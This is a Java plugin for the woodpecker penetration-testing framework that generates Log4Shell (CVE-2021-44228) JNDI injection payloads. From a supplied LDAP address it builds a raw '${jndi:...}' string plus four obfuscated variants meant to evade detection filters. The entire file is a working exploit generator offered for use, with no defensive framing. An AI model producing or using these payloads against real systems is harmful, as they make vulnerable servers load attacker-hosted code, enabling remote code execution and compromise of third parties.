package me.gv7.woodpekcer.vuldb;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class Log4jRCEPlugin implements IVulPlugin {
    public static IVulPluginCallbacks callbacks;
    public static IPluginHelper pluginHelper;


    public void VulPluginMain(IVulPluginCallbacks iVulPluginCallbacks) {
        this.callbacks = iVulPluginCallbacks;
        this.pluginHelper = callbacks.getPluginHelper();
        callbacks.setVulPluginName("log4j payload generator");
        callbacks.setVulPluginVersion("0.1.1");
        callbacks.setVulPluginAuthor("woodpecker-org");
        callbacks.setVulId("CVE-2021-44228");
        callbacks.setVulCVSS(10.0);
        callbacks.setVulName("log4j jndi inject");
        callbacks.setVulDescription("Log4j反序列化荷载生成器");
        callbacks.setVulCategory("jndi inject");
        callbacks.setVulAuthor("alibaba cloud");
        callbacks.setVulScope("2.x <= version <= 2.15.rc1");
        callbacks.setVulDisclosureTime("2021.12.09");
        callbacks.setVulProduct("log4j");
        callbacks.setVulSeverity("high");
        List<IPayloadGenerator> payloadGeneratorList = new ArrayList<IPayloadGenerator>();
        payloadGeneratorList.add(new JNDIPayloadGenerator());
        callbacks.registerPayloadGenerator(payloadGeneratorList);
    }


    public class JNDIPayloadGenerator implements IPayloadGenerator {

        public String getPayloadTabCaption() {
            return "jndi inject";
        }

        public IArgsUsageBinder getPayloadCustomArgs() {
            IArgsUsageBinder argsUsageBinder = pluginHelper.createArgsUsageBinder();
            List<IArg> args = new ArrayList<IArg>();
            IArg args1 = pluginHelper.createArg();
            args1.setName("jndi_address");
            args1.setDefaultValue("ldap://127.0.0.1:1099/obj");
            args1.setDescription("jndi地址");
            args1.setRequired(true);
            args.add(args1);
            argsUsageBinder.setArgsList(args);
            return argsUsageBinder;
        }

        public void generatorPayload(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
            String jndi_address = (String)customArgs.get("jndi_address");
            String tmpPayload = String.format("jndi:%s",jndi_address);
            StringObfuscator1 stringObfuscator1 = new StringObfuscator1();
            StringObfuscator2 stringObfuscator2 = new StringObfuscator2();

            resultOutput.successPrintln("Raw payload:");
            String payload = String.format("${%s}",tmpPayload);
            resultOutput.rawPrintln("\n" + payload + "\n");

            resultOutput.successPrintln("{[upper|lower]:x} Random obfuscate:");
            payload = String.format("${%s}",stringObfuscator1.obfuscateString(tmpPayload,false));
            resultOutput.rawPrintln("\n" + payload + "\n");

            resultOutput.successPrintln("{[upper|lower]:x} all the obfuscate:");
            payload = String.format("${%s}",stringObfuscator1.obfuscateString(tmpPayload,true));
            resultOutput.rawPrintln("\n" + payload + "\n");

            resultOutput.successPrintln("{::-n} random obfuscate:");
            payload = String.format("${%s}",stringObfuscator2.obfuscateString(tmpPayload,false));
            resultOutput.rawPrintln("\n" + payload + "\n");

            resultOutput.successPrintln("{::-n} all the obfuscate:");
            payload = String.format("${%s}",new StringObfuscator2().obfuscateString(tmpPayload,true));
            resultOutput.rawPrintln("\n" + payload + "\n");
        }

    }
}
